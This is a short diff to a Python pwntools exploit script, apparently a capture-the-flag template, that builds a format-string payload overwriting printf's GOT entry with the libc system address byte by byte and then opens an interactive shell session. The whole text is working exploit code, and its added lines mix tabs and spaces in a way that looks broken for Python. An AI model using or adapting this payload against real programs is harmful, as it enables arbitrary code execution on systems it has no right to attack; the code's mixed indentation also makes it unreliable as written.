@@ -55,14 +55,22 @@ def exploit(*args, **kwargs):
 	info(f"the first formatter’s offset: {{str(offset)}}")
 	
 	printf_got = elf.got.printf
-	system = 0xdeadbeef
+	system = libc.sym.system
 
-	writes = {{
-		printf_got: system,
-	}}
+	# writes = {{
+	#	printf_got: system,
+	# }}
+	# pl = fmtstr_payload(offset, writes)
 
-	pl = fmtstr_payload(offset, writes)
-	# pl = fmtstr_payload(offset, writes, numbwritten=0, strategy='small', write_size='byte')
+    writes = {{
+		printf_got  : p8(system & 0xff),
+		printf_got+1: p8((system >> 8) & 0xff),
+		printf_got+2: p8((system >> 16) & 0xff),
+    }}
+    pl = fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
+
+    print(pl)
+    print(f"length of payload: {{len(pl)}}")
 
 
     io.interactive()
